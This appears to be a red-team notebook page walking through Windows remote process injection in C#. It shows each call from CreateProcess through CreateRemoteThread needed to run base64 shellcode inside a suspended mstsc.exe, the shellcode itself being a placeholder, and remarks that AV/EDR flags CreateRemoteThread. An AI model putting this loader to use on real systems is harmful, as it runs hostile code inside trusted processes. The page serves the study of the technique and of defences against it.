# Basic Remote Process Injection API

### Basic Remote Process Injection API

#### Remote Process Injection 

1. **CreateProcess:** spawn a new process
2. **VirtualAllocEx**: allocate memory in the newly created Process. Assigns memory permissions
3. **WriteProcessMemory**: copy the shellcode into the remote process
4. **VirtualProtectEx**: Change memory permissions associated with a range of memory allocated with VirtualAllocEx in a remote process
5. **CreateRemoteThread**: creates a thread which executes the shellcode in the remote process.

## Detect OS Architecture

### Windows locations

![](../../../.gitbook/assets/image%20%28133%29.png)

### IntPtr.Size 

The size of a pointer or handle in this process, measured in bytes. The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process. You can define the process type by setting the `/platform` switch when you compile your code with the C\# and Visual Basic compilers.

#### Code example

We choose a process, check if the arch is x64 or x86 and use the related payload.

```csharp
 {
        string processis64 = "C:\\Windows\\System32\\mstsc.exe";
        string processis32 = "C:\\Windows\\SysWOW64\\mstsc.exe";
        string b4shellcode = "";
        string MyVictimProcess = "";

        if (IntPtr.Size == 4)
        {
            b64shellcode = "<base64 encoded shellcode>";
            MyVictimProcess = processis32;
        }
        else
        {
            b64shellcode = "<base64 encoded shellcode>";
            MyVictimProcess = processis64;
        }

        byte[] DecodedShell = Convert.FromBase64String(b64shellcode);
```

## CreateProcess

![](../../../.gitbook/assets/image%20%28228%29.png)

#### 3 elements require defined structures:

### **STARTUPINFO**

```csharp
public struct STARTUPINFO
{
     public Int32 cb;
     public string lpReserved;
     public string lpDesktop;
     public string lpTitle;
     public Int32 dwX;
     public Int32 dwY;
     public Int32 dwXSize;
     public Int32 dwYSize;
     public Int32 dwXCountChars;
     public Int32 dwYCountChars;
     public Int32 dwFillAttribute;
     public Int32 dwFlags;
     public Int16 wShowWindow;
     public Int16 cbReserved2;
     public IntPtr lpReserved2;
     public IntPtr hStdInput;
     public IntPtr hStdOutput;
     public IntPtr hStdError;
}

```

### **PROCESS\_INFORMATION**

```csharp
public struct PROCESS_INFORMATION
{
   public IntPtr hProcess;
   public IntPtr hThread;
   public int dwProcessId;
   public int dwThreadId;
}
```

### **dwCreationFlags**

![](../../../.gitbook/assets/image%20%28310%29.png)

### CreateProcess summary

```csharp
STARTUPINFO STinfo = new STARTUPINFO();

PROCESS_INFORMATION PR_info = new PROCESS_INFORMATION();

bool polo = CreateProcess(<Process_NAME>, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , IntPtr.Zero, null, ref STinfo, out PR_info );
```

|  |  |
| :--- | :--- |
| Process name | Process name |
| IntPtr.Zero  | No process Attributs needed\ |
| null  | process args |
| false | No Thread attributes handles |
| ProcessCreationFlags | CREATE\_NO_\__WINDOW |
| IntPtr.Zero  | No env block |
| null | Not modification for the current working directory |
| ref STinfo | ref to the startup struct |
| out PRinfo | variable which contains the output \(PROCESS\_INFORMATION format\) |

## **VirtualAllocEx**

![](../../../.gitbook/assets/image%20%28247%29.png)

```csharp
 private static UInt32 MEM_COMMIT = 0x1000;
 private static UInt32 PAGE_EXECUTE_READ = 0x20;
 private static UInt32 PAGE_READWRITE = 0x04;
```

### Parameters

* IntPrt Process = result \(out\) from CreateProcess
* IntPrt lpAddress = Let the function determine where to allocate the memory
* uint dwSize = shellcode size 
* AllocationType flAllocationType = Constant for allocation type \(MEM\_COMMIT\)
* MemoryProtection = Set permission \(PAGE\_READWRITE, ie RW\)

```csharp
byte[] DecodedShell = Convert.FromBase64String(b64shellcode);
IntPtr VirtAEx_result = VirtualAllocEx(PR_info.hProcess, IntPtr.Zero, DecodedShell.Length, MEM_COMMIT, PAGE_READWRITE);

```

## WriteProcessMemory

![](../../../.gitbook/assets/image%20%28245%29.png)

### Parameters

* IntPrt Process = result \(out\) from CreateProcess
* IntPtr lpBaseAddress = result of VirtualAllocEx, ie VirtualAEx\_result
* byte\[\] lpBuffer = shellcode
* nSize = shellcode Length
* Out InPtr = not important, put whatever here

```csharp
bool WrProcess_result = WriteProcessMemory(PR_info.hProcess,VirtAEx_result,DecodedShell,DecodedShell.Length, out whatever);
```

## VirtualProtectEx

![](../../../.gitbook/assets/image%20%28125%29.png)

### Parameters

* IntPrt Process = result \(out\) from CreateProcess
* IntPtr lpBaseAddress = result of VirtualAllocEx, ie VirtualAEx\_result
* UIntPtr dwSize = shellcode Length
* uint flNewProtect = set permission \(PAGE\_EXECUTE\_READ \) 
* Out uint lpfloldProtect = not important, put whatever here

```csharp
VirtProcte_result = VirtualProtectEx(PR_info.hProcess, VirtAEx_result, DecodedShell.Length, PAGE_EXECUTE_READ, out whatever2 );
```

## CreateRemoteThread

![](../../../.gitbook/assets/image%20%28252%29.png)

### Parameters

* IntPrt Process = result \(out\) from CreateProcess
* IntPtr lpThreadAttributes = IntPtr.zero \(defaut security descriptors\)
* uint dwStackSize = 0 \(no stack size spec\)
* IntPtr lpStartAddress = result of VirtualAllocEx
* IntPtr lpParameter = IntPtr.Zero, no variable specification
* uint dwCreationFlags = 0, run the thread immediately
* out IntPtr lpThreadId = IntPtr.Zero \(no need for thread id\)

```csharp
CreateRemoteThread(PR_info.hProcess, IntPtr.Zero, 0, VirtAEx_result, IntPtr.Zero, 0, IntPtr.Zero);
```

{% hint style="warning" %}
CreateRemoteThread is flagged by AV/EDR products :\)
{% endhint %}

## Resources

{% embed url="http://www.pinvoke.net/index.aspx" %}

